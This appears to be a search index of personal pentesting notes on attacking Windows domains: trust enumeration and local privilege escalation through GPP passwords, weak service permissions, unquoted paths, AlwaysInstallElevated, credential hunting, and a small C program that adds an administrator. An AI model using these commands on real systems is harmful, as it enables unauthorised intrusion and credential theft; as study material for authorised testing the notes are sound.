{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Documentation and documentation and documentation # This is some documentation I have build up over the years. Everything is work in progress, some stuff is years old and might not be relevant. Other stuff is new and not so bad.","title":"Documentation and documentation and documentation"},{"location":"#documentation-and-documentation-and-documentation","text":"This is some documentation I have build up over the years. Everything is work in progress, some stuff is years old and might not be relevant. Other stuff is new and not so bad.","title":"Documentation and documentation and documentation"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/","text":"What is domain trust? # Domain trust is a concept used to establish trust between domains. If there is trust between two domains users can access resources in the other domain. Domain forest is a group of domains that trust each other. Forests maybe also have trust between them. Types of trust # Parent/Child Part of the same forest. Retains an implicit two-way transitive trust. I think this might be stuff like child: test.mydomain.local, and parent mydomain.local. Crosslink Transitive trust. # If Domain A trusts Domain B, and Domain B trust domain C, then Domain A trusts Domain C. So you can have trust-chains. Directional trust # You can have One way trust and bidirectional trust. A bidirectional trust is simply two one-way trusts. If A is trusted by B. That means that A can access resources in B. Think of it like this: If A is trusted by B, then B will let A into his house. Attack Strategy # As always the first part of an attack is enumeration. We need to know the following: 1. Which domains have trusts with each other Essentially create a map of trusts between domains. Enumerate any user/group/computer (security principals) that in one domain that has access to resources in another domain. For example, member in local Admin group. What we want to do is look for some kind of bridge between the two domains. That is usually the case, because a trust relationship is usually implemented because resources need to be shared over the domain bounderies. It might be possible with kerberoasting over boundries. Exploit the identified targets Map the domain trusts # This can be done using three techniques: Win32 API Calls, various .NET methods, and LDAP queries. With PowerShell this can be done with the following code: ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships() ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() The functionality is also included in PowerView, and can be run like this: Get-DomainTrust Get-ForestTrust","title":"Attacking Domain Trust"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#what-is-domain-trust","text":"Domain trust is a concept used to establish trust between domains. If there is trust between two domains users can access resources in the other domain. Domain forest is a group of domains that trust each other. Forests maybe also have trust between them.","title":"What is domain trust?"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#types-of-trust","text":"Parent/Child Part of the same forest. Retains an implicit two-way transitive trust. I think this might be stuff like child: test.mydomain.local, and parent mydomain.local. Crosslink","title":"Types of trust"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#transitive-trust","text":"If Domain A trusts Domain B, and Domain B trust domain C, then Domain A trusts Domain C. So you can have trust-chains.","title":"Transitive trust."},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#directional-trust","text":"You can have One way trust and bidirectional trust. A bidirectional trust is simply two one-way trusts. If A is trusted by B. That means that A can access resources in B. Think of it like this: If A is trusted by B, then B will let A into his house.","title":"Directional trust"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#attack-strategy","text":"As always the first part of an attack is enumeration. We need to know the following: 1. Which domains have trusts with each other Essentially create a map of trusts between domains. Enumerate any user/group/computer (security principals) that in one domain that has access to resources in another domain. For example, member in local Admin group. What we want to do is look for some kind of bridge between the two domains. That is usually the case, because a trust relationship is usually implemented because resources need to be shared over the domain bounderies. It might be possible with kerberoasting over boundries. Exploit the identified targets","title":"Attack Strategy"},{"location":"attacking_active_directory_domain/attacking_windows_domain_domain_trust/#map-the-domain-trusts","text":"This can be done using three techniques: Win32 API Calls, various .NET methods, and LDAP queries. With PowerShell this can be done with the following code: ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships() ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() The functionality is also included in PowerView, and can be run like this: Get-DomainTrust Get-ForestTrust","title":"Map the domain trusts"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/","text":"Privilege Escalation Windows # We now have a low-privileges shell that we want to escalate into a privileged shell. Basic Enumeration of the System # Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has. # Basics systeminfo hostname # Who am I? whoami echo %username% # What users/localgroups are on the machine? net users net localgroups # More info about a specific user. Check if user has privileges. net user user1 # View Domain Groups net group /domain # View Members of Domain Group net group /domain <Group Name> # Firewall netsh firewall show state netsh firewall show config # Network ipconfig /all route print arp -A # How well patched is the system? wmic qfe get Caption,Description,HotFixID,InstalledOn 1. Group Policy Preference # If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there. This is the easiest technique, and the one that should be tried first. First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere. This is the domain-name. You can now go to \\\\hackdomain.local\\SYSVOL\\hackdomain.local\\policies and search for passwords there. You can either go with the explorer or with powershell. cd \\\\hackdomain.local\\SYSVOL findstr /r /s:cpassword Using PowerSploit # You can use Get-GPPPassword from powersploit to get gpp-passwords. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1 You can also use Get-CachedGPPPassword . It is included in the PowerSploit Privesc module. Using Metasploit # post/windows/gather/credentials/gpp Manually # First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s If we find the file with a password in it, we can decrypt it like this in Kali gpp-decrypt encryptedpassword Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes 2. Services with Vulnerble Permissions # Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions. 2.1 Insecure Registry Permissions # In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test. References: https://pentestlab.blog/tag/imagepath/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 2.2 Insecure Service Permissions # This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration. First we need to know which services out user has the right to configure. That can be done with the sysinternal tool accesschk.exe or with powersploit Using PowerSploit - Privesc # Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath Using accesschk.exe # accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Manually # First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html 2.3 Insecure Service File/folder permissions # If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity. PowerSploit Privesc/PowerUp # The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine. 3. Unquoted Service Paths # So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry. Exploit with PowerSploit # Get-UnquotedService Manually # Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path 4. AlwaysInstallElevated - Install new program as privileged user # This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation. 5. DLL Hijacking # First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist. Run it locally # One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load. Check the executable and check for LoadLibrary functions. # I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 6. Check installed software for exploits # Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations. 7. Cleartext Passwords / Stored credentials # Search for them # findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.* In Common Files # These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini In Registry # # VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Check browser creds # So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds 8. Kernel exploits # Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know. Service only available from inside # Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us! Vulnerable Drivers # Some driver might be vulnerable. I don't know how to check this in an efficient way. # List all drivers driverquery Hot potato # Never tried. https://foxglovesecurity.com/2016/01/16/hot-potato/ Scheduled Tasks - Only works on Windows 2000/xp/2003 # Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite. schtasks /query /fo LIST /v This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr . So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Escalate to SYSTEM from Administrator # On Windows XP and Older # If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up. Vista and Newer # You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe Kitrap # On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe . I think it only works with GUI. vdmallowed.exe vdmexploit.dll Using Metasploit # So if you have a metasploit meterpreter session going you can run getsystem . Post modules # Some interesting metasploit post-modules First you need to background the meterpreter shell and then you just run the post modules. You can also try some different post modules. use exploit/windows/local/service_permissions post/windows/gather/credentials/gpp run post/windows/gather/credential_collector run post/multi/recon/local_exploit_suggester run post/windows/gather/enum_shares run post/windows/gather/enum_snmp run post/windows/gather/enum_applications run post/windows/gather/enum_logged_on_users run post/windows/gather/checkvm References # http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/ http://www.fuzzysecurity.com/tutorials/16.html https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/ http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html https://github.com/gentilkiwi/mimikatz http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be https://www.youtube.com/watch?v=PC_iMqiuIRQ http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp http://pwnwiki.io/#!privesc/windows/index.md","title":"Local Privilige Escalation"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#privilege-escalation-windows","text":"We now have a low-privileges shell that we want to escalate into a privileged shell.","title":"Privilege Escalation Windows"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#basic-enumeration-of-the-system","text":"Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has. # Basics systeminfo hostname # Who am I? whoami echo %username% # What users/localgroups are on the machine? net users net localgroups # More info about a specific user. Check if user has privileges. net user user1 # View Domain Groups net group /domain # View Members of Domain Group net group /domain <Group Name> # Firewall netsh firewall show state netsh firewall show config # Network ipconfig /all route print arp -A # How well patched is the system? wmic qfe get Caption,Description,HotFixID,InstalledOn","title":"Basic Enumeration of the System"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#1-group-policy-preference","text":"If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there. This is the easiest technique, and the one that should be tried first. First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere. This is the domain-name. You can now go to \\\\hackdomain.local\\SYSVOL\\hackdomain.local\\policies and search for passwords there. You can either go with the explorer or with powershell. cd \\\\hackdomain.local\\SYSVOL findstr /r /s:cpassword","title":"1. Group Policy Preference"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#using-powersploit","text":"You can use Get-GPPPassword from powersploit to get gpp-passwords. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1 You can also use Get-CachedGPPPassword . It is included in the PowerSploit Privesc module.","title":"Using PowerSploit"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#using-metasploit","text":"post/windows/gather/credentials/gpp","title":"Using Metasploit"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#manually","text":"First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s If we find the file with a password in it, we can decrypt it like this in Kali gpp-decrypt encryptedpassword Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes","title":"Manually"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#2-services-with-vulnerble-permissions","text":"Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions.","title":"2. Services with Vulnerble Permissions"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#21-insecure-registry-permissions","text":"In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test. References: https://pentestlab.blog/tag/imagepath/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"2.1 Insecure Registry Permissions"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#22-insecure-service-permissions","text":"This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration. First we need to know which services out user has the right to configure. That can be done with the sysinternal tool accesschk.exe or with powersploit","title":"2.2 Insecure Service Permissions"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#using-powersploit-privesc","text":"Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath","title":"Using PowerSploit - Privesc"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#using-accesschkexe","text":"accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"Using accesschk.exe"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#manually_1","text":"First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html","title":"Manually"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#23-insecure-service-filefolder-permissions","text":"If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity.","title":"2.3 Insecure Service File/folder permissions"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#powersploit-privescpowerup","text":"The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire 